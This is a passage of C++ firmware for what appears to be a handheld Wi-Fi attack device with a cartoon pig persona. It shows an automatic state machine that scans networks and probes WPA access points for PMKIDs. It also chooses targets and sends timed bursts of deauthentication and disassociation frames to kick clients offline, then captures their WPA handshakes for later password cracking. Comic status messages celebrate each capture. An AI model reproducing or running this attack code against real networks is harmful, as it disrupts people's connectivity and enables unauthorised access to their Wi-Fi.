                if (pendingHandshakes[slot]->capturedMask & (1 << msgIdx)) {
                    // Frame is present in the queued data
                    if (hs.frames[msgIdx].len == 0) {  // Not already captured
                        uint16_t copyLen = pendingHandshakes[slot]->frames[msgIdx].len;
                        if (copyLen > 0 && copyLen <= 512) {
                            // EAPOL payload
                            memcpy(hs.frames[msgIdx].data, pendingHandshakes[slot]->frames[msgIdx].data, copyLen);
                            hs.frames[msgIdx].len = copyLen;
                            hs.frames[msgIdx].messageNum = msgIdx + 1;
                            hs.frames[msgIdx].timestamp = millis();
                            
                            // Full 802.11 frame for PCAP
                            uint16_t fullLen = pendingHandshakes[slot]->frames[msgIdx].fullFrameLen;
                            if (fullLen > 0 && fullLen <= 300) {
                                memcpy(hs.frames[msgIdx].fullFrame, pendingHandshakes[slot]->frames[msgIdx].fullFrame, fullLen);
                                hs.frames[msgIdx].fullFrameLen = fullLen;
                                hs.frames[msgIdx].rssi = pendingHandshakes[slot]->frames[msgIdx].rssi;
                            }
                            
                            hs.capturedMask |= (1 << msgIdx);
                            hs.lastSeen = millis();
                        }
                    }
                }
            }
            
            // Get SSID for this BSSID
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
                    strncpy(hs.ssid, net.ssid, 32);
                    hs.ssid[32] = 0;
                    break;
                }
            }
            
            // Check if handshake is now complete
            if (hs.isComplete() && !hs.saved) {
                pendingHandshakeComplete = true;
                strncpy(pendingHandshakeSSID, hs.ssid, 32);
                pendingHandshakeSSID[32] = 0;
                WarhogMode::markCaptured(hs.bssid);

                // Change 9: Set O(1) completion flag
                memcpy(justCompletedBssid, hs.bssid, 6);
                handshakeJustCompleted = true;

                // Defer auto-save until we're outside capture-critical states.
                pendingAutoSave = true;
            }
            
            // Handle PMKID from M1 if present
            if (pendingHandshakes[slot]->hasPMKID) {
                int pIdx = findOrCreatePMKIDSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
                if (pIdx >= 0 && !pmkids[pIdx].saved) {
                    memcpy(pmkids[pIdx].pmkid, pendingHandshakes[slot]->pmkid, 16);
                    // Get SSID
                    for (const auto& net : networks()) {
                        if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
                            strncpy(pmkids[pIdx].ssid, net.ssid, 32);
                            pmkids[pIdx].ssid[32] = 0;
                            break;
                        }
                    }
                }
            }
        }
        
        // Release slot back to static pool (no heap ops), advance read pointer.
        // Clear pointer and allocated BEFORE releasing busy — ensures producer
        // won't see this slot as a valid existing entry during its BSSID scan.
        pendingHandshakes[slot] = nullptr;
        pendingHsAllocated[slot] = false;
        pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
        pendingHsBusy[slot].store(false);  // Release CAS lock
    }
    
    // Process pending PMKID creation (callback queued, we do push_back here)
    {
        PendingPMKIDCreate pmkidPending = {};
        while (dequeuePendingPMKID(pmkidPending)) {
            int idx = findOrCreatePMKIDSafe(pmkidPending.bssid, pmkidPending.station);
            if (idx >= 0 && !pmkids[idx].saved) {
                memcpy(pmkids[idx].pmkid, pmkidPending.pmkid, 16);
                pmkids[idx].timestamp = millis();

                // SSID lookup: try callback value first, then lookup from networks
                if (pmkidPending.ssid[0] != 0) {
                    strncpy(pmkids[idx].ssid, pmkidPending.ssid, 32);
                    pmkids[idx].ssid[32] = 0;
                } else {
                    for (const auto& net : networks()) {
                        if (memcmp(net.bssid, pmkidPending.bssid, 6) == 0) {
                            strncpy(pmkids[idx].ssid, net.ssid, 32);
                            pmkids[idx].ssid[32] = 0;
                            break;
                        }
                    }
                }
                WarhogMode::markCaptured(pmkids[idx].bssid);
            }
        }
    }
    
    // ============ End Deferred Event Processing ============
    
    // RELEASE LOCK EARLY - state machine doesn't need exclusive vector access
    // This minimizes packet drop window from ~10ms to ~0.5ms
    oinkBusy = false;
    
    // Periodic beacon data audit to prevent leaks (every 10s - Phase 3A fix)
    // Free beacon data from saved handshakes to reclaim heap
    static uint32_t lastBeaconAudit = 0;
    if (now - lastBeaconAudit > 10000) {
        for (auto& hs : handshakes) {
            if (hs.saved && hs.beaconData) {
                free(hs.beaconData);
                hs.beaconData = nullptr;
                hs.beaconLen = 0;
            }
        }
        lastBeaconAudit = now;
    }
    
    // Sync grass animation with channel hopping state
    Avatar::setGrassMoving(channelHopping);

    // Sync fruit tree with attack state
    {
        bool wantTree = (autoState == AutoState::LOCKING ||
                         autoState == AutoState::ATTACKING ||
                         autoState == AutoState::WAITING);
        static bool hadTree = false;

        if (wantTree && !hadTree) {
            // Count attackable networks with clients on current channel
            uint8_t fruits = 0;
            uint8_t ch = NetworkRecon::getCurrentChannel();
            NetworkRecon::enterCritical();
            for (size_t i = 0; i < networks().size() && fruits < 8; i++) {
                const auto& n = networks()[i];
                if (n.channel != ch) continue;
                if (n.authmode == WIFI_AUTH_OPEN || n.isHidden) continue;
                if (NetworkRecon::estimateClientCount(n) > 0) fruits++;
            }
            NetworkRecon::exitCritical();
            if (fruits > 0) Avatar::showTree(fruits);
        } else if (!wantTree && hadTree) {
            Avatar::hideTree();
        }
        hadTree = wantTree;
    }

    // === Background C5 5GHz polling (independent of autoState) ===
    // Runs every update() regardless of what the 2.4GHz state machine is doing
    static const char* c5DispatchPhrases[] = {
        "AVADA KEDAWRA KURRRWA", "EXPECTO PAKIETUM", "CRUCIO 5GHZ",
        "WINGARDIUM DEAUTHOSA", "SECTUMSEMPRA 5G", "DZIK JEDZIE NA 5G",
        "IGNI KURWA IGNI", "KIELBASA INBOUND", "5G WPIERDOL BRUV",
        "O KURWA DUAL BAND"
    };
    static const char* c5CapturePhrases[] = {
        "5G PWNED KURWA MAC", "DZIK ZJADL TRUFEL", "BIGOS Z 5GHZ",
        "KURWA TO DZIALA", "5G KIELBASA PODANA", "PROTEGO THIS KURWA"
    };
    static const char* c5FailPhrases[] = {
        "CHOLERA 5G FIZZLED", "DZIK MISSED KURWA", "5G DUPA",
        "FINITE INCANTATEM KURWA"
    };
    static const char* c5TimeoutPhrases[] = {
        "5G KURWA TIMEOUT", "C5 PIERDOLI SIE", "DZIK ZASNAL NA 5G"
    };

    if (c5BackgroundActive) {
        HandshakeResult hr = JanusHog::getHandshakeResult();
        if (hr == HandshakeResult::CAPTURED) {
            JanusHog::clearHandshakeResult();
            Serial.println("[OINK] 5GHz handshake captured via C5 (background)");
            NetworkRecon::enterCritical();
            for (auto& net : networks()) {
                if (memcmp(net.bssid, c5BackgroundBssid, 6) == 0) {
                    net.hasHandshake = true;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            WarhogMode::markCaptured(c5BackgroundBssid);
            strncpy(lastPwnedSSID, c5BackgroundSSID[0] ? c5BackgroundSSID : "5GHz TARGET", sizeof(lastPwnedSSID) - 1);
            lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
            Mood::onHandshakeCaptured(lastPwnedSSID);
            Mood::setStatusMessage(c5CapturePhrases[random(0, 6)]);
            Display::showLoot(lastPwnedSSID);
            c5BackgroundActive = false;
        } else if (hr == HandshakeResult::FAILED) {
            JanusHog::clearHandshakeResult();
            Serial.println("[OINK] 5GHz C5 attack failed (background)");
            Mood::setStatusMessage(c5FailPhrases[random(0, 4)]);
            c5BackgroundActive = false;
        } else if (!JanusHog::isConnected()) {
            JanusHog::clearHandshakeResult();
            Serial.println("[OINK] C5 disconnected during background attack");
            c5BackgroundActive = false;
        } else if (now - c5BackgroundStartTime > C5_BACKGROUND_TIMEOUT) {
            JanusHog::requestStop();
            JanusHog::clearHandshakeResult();
            Serial.println("[OINK] 5GHz C5 background attack timeout");
            Mood::setStatusMessage(c5TimeoutPhrases[random(0, 3)]);
            c5BackgroundActive = false;
        }
    }

    // Auto-attack state machine (like M5Gotchi)
    switch (autoState) {
        case AutoState::SCANNING:
            {
                // Change 8: Longer dwell time during scanning increases beacon/data capture
                // 250ms ≈ 2.5 beacon intervals, 67% more capture probability than default 150ms
                NetworkRecon::setHopIntervalOverride(250);

                uint16_t hopInterval = FlexesScreen::getChannelHopInterval();
                
                // Channel hopping during scan (buff-modified interval)
                if (now - lastHopTime > hopInterval) {
                    hopChannel();
                    lastHopTime = now;
                }
                
                // Random hunting sniff - shows piglet is actively sniffing
                // Check every 1 second with 8% chance = ~12 second average between sniffs
                if (now - lastRandomSniff > 1000) {
                    lastRandomSniff = now;  // Always reset timer on check
                    if (random(0, 100) < RANDOM_SNIFF_CHANCE) {
                        Avatar::sniff();
                    }
                }
                
                // Update mood
                if (now - lastMoodUpdate > 3000) {
                    Mood::onSniffing(networks().size(), currentChannel);
                    lastMoodUpdate = now;
                }
                
                // After scan time, sort and enter PMKID hunting
                if (now - stateStartTime > SCAN_TIME) {
                    NetworkRecon::setHopIntervalOverride(0);  // Clear scanning dwell override
                    if (!networks().empty()) {
                        sortNetworksByPriority();
                        autoState = AutoState::PMKID_HUNTING;
                        pmkidTargetIndex = -1;
                        pmkidProbeTime = 0;  // Reset timer for first target
                        pmkidProbedBitset = 0;
                        stateStartTime = now;
                        Mood::setStatusMessage("ghost farming");
                    } else {
                        // No networks found after scan time
                        consecutiveFailedScans++;
                        if (consecutiveFailedScans >= BORED_THRESHOLD) {
                            // Pig is bored - empty spectrum
                            autoState = AutoState::BORED;
                            stateStartTime = now;
                            channelHopping = false;
                            Mood::onBored(0);
                        } else {
                            // Keep scanning
                            stateStartTime = now;
                        }
                    }
                }
            }
            break;
            
        case AutoState::PMKID_HUNTING:
            {
                uint32_t huntElapsed = now - stateStartTime;

                // Change 5: Dynamic PMKID cap — scales with network count, caps at 10s for <=25 networks
                uint16_t netCount = NetworkRecon::getNetworkCount();
                uint32_t pmkidCap = (netCount > 0)
                    ? min((uint32_t)PMKID_HUNT_MAX, max((uint32_t)10000, (uint32_t)netCount * 400))
                    : 10000;

                if (huntElapsed > pmkidCap) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    Mood::setStatusMessage("weapons hot");
                    break;
                }
                
                // Only find new target if: first time OR timeout expired
                if (pmkidProbeTime == 0 || (now - pmkidProbeTime >= PMKID_TIMEOUT)) {
                    bool foundTarget = false;
                    uint8_t targetBssid[6] = {0};
                    char targetSSID[33] = {0};
                    uint8_t targetChannel = 0;
                    
                    const bool wasBusy = oinkBusy;
                    oinkBusy = true;
                    NetworkRecon::enterCritical();
                    size_t netCount = networks().size();
                    if (netCount > 0) {
                        for (int attempts = 0; attempts < (int)netCount && !foundTarget; attempts++) {
                            pmkidTargetIndex = (pmkidTargetIndex + 1) % netCount;
                            DetectedNetwork& net = networks()[pmkidTargetIndex];
                            
                            // Skip: Open, WEP, BOAR BRO, PMF, or already have PMKID
                            if (net.authmode == WIFI_AUTH_OPEN) continue;
                            if (net.authmode == WIFI_AUTH_WEP) continue;
                            if (isExcluded(net.bssid)) continue;  // BOAR BRO exclusion
                            if (net.ssid[0] == 0 || net.isHidden) continue;
                            if (net.hasPMF) continue;
                            
                            // Check if we already have PMKID for this AP
                            bool hasPMKID = false;
                            for (const auto& p : pmkids) {
                                if (memcmp(p.bssid, net.bssid, 6) == 0) {
                                    hasPMKID = true;
                                    break;
                                }
                            }
                            if (hasPMKID) continue;

                            // Skip networks already probed this cycle
                            if (pmkidTargetIndex < 64 && (pmkidProbedBitset & (1ULL << pmkidTargetIndex))) continue;

                            foundTarget = true;
                            memcpy(targetBssid, net.bssid, 6);
                            strncpy(targetSSID, net.ssid, 32);
                            targetSSID[32] = 0;
                            targetChannel = net.channel;
                        }
                    }
                    NetworkRecon::exitCritical();
                    oinkBusy = wasBusy;
                    
                    if (foundTarget) {
                        // Always lock channel for PMKID probe (even if already on it)
                        // Without lock, NetworkRecon can hop away before AP's M1 response
                        setChannel(targetChannel);
                        // IEEE 802.11 state machine: Auth must precede Assoc
                        // Most APs silently drop Assoc from unauthenticated STAs
                        sendAuthenticationRequest(targetBssid);
                        delay(10);  // AP processes auth in <2ms; 10ms is safe margin
                        sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
                        Avatar::waveRipple(WaveMode::OUTGOING);
                        pmkidProbeTime = now;
                        if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
                        Avatar::sniff();
                    } else {
                        // No more targets to probe
                        autoState = AutoState::NEXT_TARGET;
                        stateStartTime = now;
                        Mood::setStatusMessage("weapons hot");
                    }
                }
                // else: still waiting for M1 response, do nothing
            }
            break;
            
        case AutoState::NEXT_TARGET:
            {
                // Use smart target selection
                int nextIdx = getNextTarget();

                if (nextIdx < 0) {
                    consecutiveFailedScans++;

                    if (consecutiveFailedScans >= BORED_THRESHOLD) {
                        // Pig is bored - no targets for too long
                        autoState = AutoState::BORED;
                        stateStartTime = now;
                        channelHopping = false;  // Stop grass animation
                        deauthing = false;
                        Mood::onBored(networks().size());
                    } else {
                        // Keep trying - rescan
                        autoState = AutoState::SCANNING;
                        stateStartTime = now;
                        channelHopping = true;
                        deauthing = false;
                        Mood::setStatusMessage("sniff n drift");
                    }
                    break;
                }

                // Found a target - reset failed scan counter
                consecutiveFailedScans = 0;

                // Revalidate: Network might have been removed between getNextTarget() and here
                if (nextIdx >= (int)networks().size()) {
                    autoState = AutoState::SCANNING;
                    stateStartTime = now;
                    channelHopping = true;
                    break;
                }

                // === 5GHz target: fire-and-forget to C5, don't block state machine ===
                bool targetIs5g = false;
                NetworkRecon::enterCritical();
                if (nextIdx < (int)networks().size()) {
                    targetIs5g = networks()[nextIdx].is5GHz();
                }
                NetworkRecon::exitCritical();

                if (targetIs5g) {
                    // Snapshot target info and dispatch to C5 background
                     NetworkRecon::enterCritical();
                     if (nextIdx < (int)networks().size()) {
                         memcpy(c5BackgroundBssid, networks()[nextIdx].bssid, 6);
                         strncpy(c5BackgroundSSID, networks()[nextIdx].ssid, 32);
                         c5BackgroundSSID[32] = '\0';
                     }
                     NetworkRecon::exitCritical();

                     if (JanusHog::isReady() && JanusHog::requestHandshake(c5BackgroundBssid)) {
                         // Only count an "attempt" if the dispatch actually started.
                         // (C5 can be connected but busy with scan/import, in which case requestHandshake won't run.)
                         NetworkRecon::enterCritical();
                         for (auto& net : networks()) {
                             if (memcmp(net.bssid, c5BackgroundBssid, 6) == 0) {
                                 net.attackAttempts++;
                                 break;
                             }
                         }
                         NetworkRecon::exitCritical();

                         c5BackgroundActive = true;
                         c5BackgroundStartTime = now;
                         Serial.printf("[OINK] 5GHz dispatched to C5 bg: %s\n", c5BackgroundSSID);
                         Mood::setStatusMessage(c5DispatchPhrases[random(0, 10)]);
                     }
                    // Don't enter LOCKING — loop back to find a 2.4GHz target.
                    // Next getNextTarget() skips 5GHz while c5BackgroundActive.
                    break;
                }

                // === 2.4GHz target: normal state machine path ===
                selectionIndex = nextIdx;

                // Select this target (locks to channel, stops hopping)
                selectTarget(selectionIndex);
                networks()[selectionIndex].attackAttempts++;

                // Go to LOCKING state to discover clients before attacking
                autoState = AutoState::LOCKING;
                stateStartTime = now;
                deauthing = false;  // Don't deauth yet, just listen
                channelHopping = false;  // Ensure channel stays locked during capture phase

                // #region agent log - H1/H2 state transition to LOCKING
                Serial.printf("[DBG-H1H2] ->LOCKING target=%s ch=%d PMF=%d reconLocked=%d\n", networks()[selectionIndex].ssid, networks()[selectionIndex].channel, networks()[selectionIndex].hasPMF ? 1 : 0, NetworkRecon::isChannelLocked() ? 1 : 0);
                // #endregion

                Mood::setStatusMessage("sniffin clients");
                Avatar::sniff();  // Nose twitch when sniffing for auths
            }
            break;
            
        case AutoState::LOCKING:
            {
            // #region agent log - H1/H2 channel during LOCKING
            {
                static uint32_t lastLockLog = 0;
                if (now - lastLockLog > 500) {
                    lastLockLog = now;
                    Serial.printf("[DBG-H1H2] LOCKING oinkCh=%d reconCh=%d locked=%d tgtIdx=%d\n", currentChannel, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0, targetIndex);
                }
            }
            // #endregion
            // Wait on target channel to discover clients via data frames
            // This is crucial - targeted deauth is much more effective
            if (targetIndex < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                break;
            }
            
            // Rebind target index by BSSID snapshot (avoid stale index/races)
            DetectedNetwork targetCopy = {};
            int foundIdx = -1;
            const bool wasBusy = oinkBusy;
            oinkBusy = true;
            NetworkRecon::enterCritical();
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    targetCopy = networks()[i];
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            oinkBusy = wasBusy;

            if (foundIdx < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                targetIndex = -1;
                memset(targetBssid, 0, 6);
                clearTargetClients();
                break;
            }

            targetIndex = foundIdx;
            {
                uint32_t lockElapsed = now - stateStartTime;
                bool hasRecentClient = (targetCopy.lastDataSeen > 0) &&
                    (now - targetCopy.lastDataSeen) <= CLIENT_RECENT_MS;

                // Change 4: At 2s into LOCKING with no clients, send ONE broadcast deauth
                // to provoke reassociation traffic that reveals clients via data frames
                {
                    static bool lockProbeDeauthSent = false;
                    if (lockElapsed < 500) lockProbeDeauthSent = false;  // Reset on new lock
                    if (!lockProbeDeauthSent && !hasRecentClient && lockElapsed >= 2000) {
                        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                        sendDeauthFrame(targetCopy.bssid, broadcast, 7);
                        lockProbeDeauthSent = true;
                    }
                }

                // Change 4: First attempt gets 6s LOCKING, retries get 4s (already know client landscape)
                uint32_t earlyExitMs = (targetCopy.attackAttempts == 0) ? 6000 : LOCK_EARLY_EXIT_MS;
                if (!hasRecentClient && lockElapsed >= earlyExitMs) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                    break;
                }

                if (hasRecentClient && lockElapsed >= LOCK_FAST_TRACK_MS) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                    break;
                }

                if (lockElapsed > FlexesScreen::getLockTime()) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                    // #region agent log - H6 state to ATTACKING
                    Serial.printf("[DBG-H6] ->ATTACKING after lock timeout\n");
                    // #endregion
                }
            }
            break;
            }
            
        case AutoState::ATTACKING:
            {
                // 5GHz targets are handled by background C5 polling above —
                // this state only handles 2.4GHz local deauth + capture.

                // Snapshot target data to avoid races with callback updates
                bool targetFound = false;
                uint8_t targetBssidLocal[6] = {0};
                char targetSSIDLocal[33] = {0};
                bool targetHasPMF = false;
                uint8_t clientCountLocal = 0;
                uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6] = {};

                const bool wasBusy = oinkBusy.load(std::memory_order_relaxed);
                oinkBusy.store(true, std::memory_order_relaxed);
                NetworkRecon::enterCritical();
                for (int i = 0; i < (int)networks().size(); i++) {
                    if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                        targetFound = true;
                        targetIndex = i;
                        memcpy(targetBssidLocal, networks()[i].bssid, 6);
                        strncpy(targetSSIDLocal, networks()[i].ssid, 32);
                        targetSSIDLocal[32] = 0;
                        targetHasPMF = networks()[i].hasPMF;
                        break;
                    }
                }

                // Snapshot client list under same spinlock (protects against trackTargetClient on core 1)
                if (targetFound) {
                    clientCountLocal = targetClientCount;
                    if (clientCountLocal > MAX_CLIENTS_PER_NETWORK) {
                        clientCountLocal = MAX_CLIENTS_PER_NETWORK;
                    }
                    for (uint8_t c = 0; c < clientCountLocal; c++) {
                        memcpy(clientMacs[c], targetClients[c].mac, 6);
                    }
                }
                NetworkRecon::exitCritical();
                oinkBusy.store(wasBusy, std::memory_order_relaxed);

                if (!targetFound) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                    break;
                }

                uint32_t pauseUntil = deauthPauseUntilMs.load(std::memory_order_relaxed);
                bool listenWindowActive = (pauseUntil != 0) && ((int32_t)(pauseUntil - now) > 0);

                // Change 3: Adaptive listen window - extend pause based on capture state
                if (listenWindowActive) {
                    // Check what we have so far for this target
                    bool hasM1Only = false;
                    bool hasM1M2 = false;
                    for (const auto& hs : handshakes) {
                        if (memcmp(hs.bssid, targetBssidLocal, 6) == 0) {
                            if (hs.hasM1() && !hs.hasM2()) hasM1Only = true;
                            if (hs.hasM1() && hs.hasM2()) hasM1M2 = true;
                            break;
                        }
                    }
                    // M1 only after initial window: extend to 2500ms (slow IoT clients)
                    if (hasM1Only && (int32_t)(pauseUntil - now) < 200) {
                        deauthPauseUntilMs.store(now + 2500, std::memory_order_relaxed);
                    }
                    // M1+M2 captured: keep listening 500ms more for M3/M4 bonus
                    if (hasM1M2 && (int32_t)(pauseUntil - now) < 100) {
                        deauthPauseUntilMs.store(now + 500, std::memory_order_relaxed);
                    }
                }

                // M1 detected: immediately clear any in-progress deauth burst
                if (listenWindowActive && deauthBurst.active) {
                    deauthBurst.active = false;
                }

                // Non-blocking deauth: process ONE frame per update() call (Change 1 + Change 6)
                if (!listenWindowActive) {
                    // Skip if PMF (shouldn't happen but safety check)
                    if (targetHasPMF) {
                        selectionIndex++;
                        autoState = AutoState::NEXT_TARGET;
                        deauthBurst.active = false;
                        break;
                    }

                    // Process active burst: send one frame when timer expires
                    if (deauthBurst.active && now >= deauthBurst.nextSendTime) {
                        uint8_t ci = deauthBurst.clientIndex;
                        if (deauthBurst.direction == 0) {
                            // AP -> Client
                            sendDeauthFrame(deauthBurst.targetBssid, deauthBurst.clientMacs[ci], 7);
                            deauthBurst.direction = 1;
                            uint8_t jitterMax = FlexesScreen::getDeauthJitterMax();
                            deauthBurst.nextSendTime = now + random(1, jitterMax + 1);
                        } else {
                            // Client -> AP (reverse)
                            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                            if (memcmp(deauthBurst.clientMacs[ci], broadcast, 6) != 0) {
                                sendDeauthFrame(deauthBurst.clientMacs[ci], deauthBurst.targetBssid, 1);
                            }
                            deauthBurst.direction = 0;
                            deauthBurst.frameCount--;
                            deauthCount++;

                            if (deauthBurst.frameCount == 0) {
                                // Move to next client or switch to maintenance phase
                                deauthBurst.clientIndex++;
                                if (deauthBurst.clientIndex < deauthBurst.clientTotal) {
                                    // Next client: restart knock phase
                                    deauthBurst.frameCount = 2;
                                    deauthBurst.phase = 0;
                                    deauthBurst.direction = 0;
                                    deauthBurst.nextSendTime = now + DEAUTH_KNOCK_INTERVAL_MS;
                                } else if (deauthBurst.phase == 0) {
                                    // All clients knocked, switch to maintenance drip
                                    deauthBurst.phase = 1;
                                    deauthBurst.clientIndex = 0;
                                    deauthBurst.frameCount = 1;
                                    deauthBurst.direction = 0;
                                    deauthBurst.nextSendTime = now + DEAUTH_MAINTENANCE_MS;
                                } else {
                                    // Maintenance drip: cycle through clients
                                    deauthBurst.clientIndex = 0;
                                    deauthBurst.frameCount = 1;
                                    deauthBurst.direction = 0;
                                    deauthBurst.nextSendTime = now + DEAUTH_MAINTENANCE_MS;
                                }
                            } else {
                                // More frames for this client
                                uint32_t interval = (deauthBurst.phase == 0)
                                    ? DEAUTH_KNOCK_INTERVAL_MS
                                    : DEAUTH_MAINTENANCE_MS;
                                deauthBurst.nextSendTime = now + interval;
                            }
                        }
                        lastDeauthTime = now;
                    }

                    // Start new burst if none active and enough time has passed
                    if (!deauthBurst.active && (now - lastDeauthTime > DEAUTH_BURST_INTERVAL_MS)) {
                        deauthBurst.active = true;
                        Avatar::waveRipple(WaveMode::OUTGOING);
                        memcpy(deauthBurst.targetBssid, targetBssidLocal, 6);
                        deauthBurst.phase = 0;  // Start with knock
                        deauthBurst.direction = 0;
                        deauthBurst.nextSendTime = now;

                        if (clientCountLocal > 0) {
                            deauthBurst.clientTotal = clientCountLocal;
                            for (uint8_t c = 0; c < clientCountLocal; c++) {
                                memcpy(deauthBurst.clientMacs[c], clientMacs[c], 6);
                            }
                            deauthBurst.clientIndex = 0;
                            deauthBurst.frameCount = 2;  // Initial knock: 2 fast frames

                            // Also send one disassoc per client (immediate, non-blocking)
                            for (uint8_t c = 0; c < clientCountLocal; c++) {
                                sendDisassocFrame(targetBssidLocal, clientMacs[c], 8);
                            }
                        } else {
                            // No clients: broadcast deauth + disassoc
                            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                            sendDeauthFrame(targetBssidLocal, broadcast, 7);
                            sendDisassocFrame(targetBssidLocal, broadcast, 8);
                            deauthCount++;
                            deauthBurst.active = false;  // Single shot, no burst needed
                        }

                        // Mark session as having deauthed (for Silent Witness achievement)
                        SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
                        sess.everDeauthed = true;

                        // #region agent log
                        static uint32_t lastDeauthLog = 0;
                        if (now - lastDeauthLog > 1000) {
                            lastDeauthLog = now;
                            Serial.printf("[DEAUTH-NB] clients=%d total=%lu phase=%d\n",
                                          clientCountLocal, deauthCount, deauthBurst.phase);
                        }
                        // #endregion
                    }
                }

                // Update mood with attack progress
                if (now - lastMoodUpdate > 2000) {
                    if (targetSSIDLocal[0] != 0) {
                        Mood::onDeauthing(targetSSIDLocal, deauthCount);
                    }
                    lastMoodUpdate = now;
                }

                // Change 9: O(1) handshake completion check via volatile flag
                // Replaces O(H*N) vector scan with lock-free signaling
                bool targetHandshakeCaptured = false;
                char targetHandshakeSSID[33] = {0};
                if (handshakeJustCompleted) {
                    if (memcmp(justCompletedBssid, targetBssidLocal, 6) == 0) {
                        targetHandshakeCaptured = true;
                        strncpy(targetHandshakeSSID, targetSSIDLocal, 32);
                        targetHandshakeSSID[32] = 0;
                    }
                    // Mark the network in networks vector (only take spinlock when flag is true)
                    NetworkRecon::enterCritical();
                    for (auto& net : networks()) {
                        if (memcmp(net.bssid, justCompletedBssid, 6) == 0) {
                            net.hasHandshake = true;
                            break;
                        }
                    }
                    NetworkRecon::exitCritical();
                    handshakeJustCompleted = false;
                }
                if (targetHandshakeCaptured) {
                    deauthBurst.active = false;  // Stop deauthing
                    if (targetHandshakeSSID[0] != 0) {
                        SDLog::log("OINK", "Handshake captured: %s", targetHandshakeSSID);
                    } else {
                        SDLog::log("OINK", "Handshake captured");
                    }
                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                }
                
                // Timeout - move to next target
                if (autoState == AutoState::ATTACKING && now - attackStartTime > ATTACK_TIMEOUT) {
                    deauthBurst.active = false;  // Stop any in-progress burst

                    // Change 7: Reduced cooldown for M1-only captures (we were close, retry fast)
                    bool hasM1OnlyForTarget = false;
                    for (const auto& hs : handshakes) {
                        if (memcmp(hs.bssid, targetBssid, 6) == 0 && hs.hasM1() && !hs.hasM2()) {
                            hasM1OnlyForTarget = true;
                            break;
                        }
                    }

                    NetworkRecon::enterCritical();
                    for (auto& net : networks()) {
                        if (memcmp(net.bssid, targetBssid, 6) == 0) {
                            if (hasM1OnlyForTarget) {
                                // M1-only: flat 2s cooldown - we were close, retry fast
                                net.cooldownUntil = now + 2000;
                            } else {
                                // Scale cooldown by RSSI: strong signals retry faster (likely timing issue),
                                // weak signals wait longer (likely signal issue)
                                int8_t tRssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
                                uint32_t cooldown;
                                if (tRssi >= -45) cooldown = 4000;
                                else if (tRssi >= -55) cooldown = 6000;
                                else if (tRssi >= -65) cooldown = 8000;
                                else cooldown = 12000;
                                net.cooldownUntil = now + cooldown;
                            }
                            break;
                        }
                    }
                    NetworkRecon::exitCritical();

                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                    // Keep channel locked during WAITING to catch late EAPOL responses
                    // Channel hopping resumes only when moving to NEXT_TARGET with no pending handshake
                }
                break;
            }
            
        case AutoState::WAITING:
            // Change 5: Opportunistic PMKID probing during WAITING (channel locked to target)
            // Probe other APs on same channel — free! Channel is already locked.
            {
                static uint32_t lastWaitPmkidProbe = 0;
                if (now - lastWaitPmkidProbe > 1500 && now - stateStartTime > 500) {
                    lastWaitPmkidProbe = now;
                    uint8_t curCh = NetworkRecon::getCurrentChannel();
                    NetworkRecon::enterCritical();
                    for (size_t i = 0; i < networks().size() && i < 30; i++) {
                        const auto& net = networks()[i];
                        if (net.channel != curCh) continue;
                        if (memcmp(net.bssid, targetBssid, 6) == 0) continue;  // Skip current target
                        if (net.authmode == WIFI_AUTH_OPEN || net.authmode == WIFI_AUTH_WEP) continue;
                        if (net.hasPMF || net.ssid[0] == 0 || net.isHidden) continue;
                        if (isExcluded(net.bssid)) continue;
                        bool hasPMKID = false;
                        for (const auto& p : pmkids) {
                            if (memcmp(p.bssid, net.bssid, 6) == 0) { hasPMKID = true; break; }
                        }
                        if (hasPMKID) continue;
                        uint8_t probeBssid[6];
                        char probeSSID[33];
                        memcpy(probeBssid, net.bssid, 6);
                        strncpy(probeSSID, net.ssid, 32);
                        probeSSID[32] = 0;
                        NetworkRecon::exitCritical();
                        sendAuthenticationRequest(probeBssid);
                        delay(10);
                        sendAssociationRequest(probeBssid, probeSSID, strlen(probeSSID));
                        goto wait_pmkid_done;
                    }
                    NetworkRecon::exitCritical();
                    wait_pmkid_done:;
                }
            }
            // Brief pause between attacks - keep channel locked for late EAPOL frames
            if (now - stateStartTime > WAIT_TIME) {
                // Check for incomplete handshake only once at WAIT_TIME threshold
                if (!checkedForPendingHandshake) {
                    checkedForPendingHandshake = true;
